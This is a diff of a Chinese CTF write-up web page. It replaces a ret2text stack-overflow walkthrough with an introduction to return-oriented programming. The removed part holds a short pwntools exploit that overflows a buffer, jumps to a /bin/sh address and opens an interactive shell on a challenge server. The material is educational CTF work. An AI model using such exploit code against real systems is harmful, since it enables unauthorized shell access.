@@ -14,7 +14,7 @@
     
     
       
-        <title>Pwn_CTFShow_02 - Trick</title>
+        <title>basic_rop - Trick</title>
       
     
     
@@ -61,7 +61,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#101ret2text" class="md-skip">
+        <a href="#basic_rop" class="md-skip">
           跳转至
         </a>
       
@@ -91,7 +91,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              Pwn_CTFShow_02
+              basic_rop
             
           </span>
         </div>
@@ -261,12 +261,10 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
     
     <label class="md-nav__link" for="nav-3">
       writeUp
@@ -308,45 +306,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        Pwn_CTFShow_02
-        <span class="md-nav__icon md-icon"></span>
-      </label>
-    
-    <a href="./" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../Pwn_CTFShow_02/" class="md-nav__link">
       Pwn_CTFShow_02
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#101ret2text" class="md-nav__link">
-    1.01栈溢出之ret2text
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -429,6 +393,8 @@
 <nav class="md-nav md-nav--secondary" aria-label="目录">
   
   
+    
+  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -437,8 +403,8 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#101ret2text" class="md-nav__link">
-    1.01栈溢出之ret2text
+  <a href="#ret2text" class="md-nav__link">
+    ret2text
   </a>
   
 </li>
@@ -456,36 +422,21 @@
               
                 
                 
-                  <h1>Pwn_CTFShow_02</h1>
-                
-                <h2 id="101ret2text">1.01栈溢出之ret2text</h2>
-<p>很简单的一个栈溢出
-直接IDA分析</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012194826370.png#pic_center" /></p>
-<p>从main函数跟进到welcome函数
-get() 很明显的溢出</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012194915979.png#pic_center" /></p>
-<pre><code class="language-python">payload = 'a'*(0x80+8)
-</code></pre>
-<p>因为是64位的，所以后面要加上8
-Shift+F12 </p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195035341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
-<p>发现/bin/sh 果然够简单的。。。
-双击进去</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195145849.png#pic_center" /></p>
-<p>再双击</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195243513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
-<p>找到地址
-exp：</p>
-<pre><code class="language-python">from pwn import *
-
-p=remote('111.231.70.44',28072)
-
-payload='a'*(0x80+8) + p64(0x40063B)
-
-p.sendline(payload)
-
-p.interactive()
+                <h1 id="basic_rop">basic_rop</h1>
+<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
+<ul>
+<li>
+<p>程序存在溢出，并且可以控制返回地址。</p>
+</li>
+<li>
+<p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p>
+</li>
+</ul>
+<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
+<h2 id="ret2text">ret2text</h2>
+<p>用 <code>checksec</code> 指令查看程序的保护机制</p>
+<pre><code>
 </code></pre>
                 
               
@@ -501,41 +452,6 @@ p.interactive()
       
         
 <footer class="md-footer">
-  
-    <div class="md-footer-nav">
-      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
-        
-          <a href="../Pwn_CTFShow_01/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-            </div>
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  上一页
-                </span>
-                Pwn_CTFShow_01
-              </div>
-            </div>
-          </a>
-        
-        
-          <a href="../Pwn_0xGame_01/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  下一页
-                </span>
-                Pwn_0xGame_01
-              </div>
-            </div>
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
-    </div>
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
